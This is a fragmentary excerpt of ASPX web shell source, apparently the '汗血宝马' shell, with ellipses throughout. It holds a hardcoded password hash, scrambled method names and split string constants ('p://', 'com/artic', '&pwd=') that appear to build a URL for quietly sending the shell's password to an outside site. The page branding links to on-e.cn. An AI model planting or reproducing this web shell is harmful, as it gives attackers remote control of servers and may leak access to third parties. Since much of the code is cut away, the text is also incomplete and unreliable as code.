...
<script runat="server">
public string Password="d3ac0df476be61f463d205f166062de9"; //
...
public readonly string pbzw = "&pwd=";
public void PBZw()
{
ZVS.Visible=true;
ljtzC.Visible=false;
...
readonly string fuze = "com/artic";
protected void fUzE()
{
...
public readonly string portble = "p://";
...
<tr class="head">
<td ><span style="float:right;"><a href="http://www.on-e.cn" target="_blank">专版aspx汗血宝马</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#003300;">Copyright © 2013-2015 <a href="http://www.on-e.cn" target="_blank">s</a><a 
